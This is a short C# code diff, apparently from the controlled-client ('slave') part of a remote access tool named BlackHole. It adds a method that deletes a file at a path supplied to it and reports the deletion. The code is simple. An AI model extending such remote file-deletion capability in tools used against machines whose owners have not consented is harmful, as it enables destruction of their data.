@@ -29,6 +29,23 @@ namespace BlackHole.Slave
         /// </summary>
         /// <param name="path"></param>
         /// <returns></returns>
+        public static FileDeletionMessage DeleteFile(string path)
+        {
+            path = Path.GetFullPath(path);
+
+            File.Delete(path);
+
+            return new FileDeletionMessage()
+            {
+                FilePath = path
+            };
+        }
+
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="path"></param>
+        /// <returns></returns>
         public static FolderNavigationMessage NavigateToFolder(string path)
         {
             // transform relative to absolute
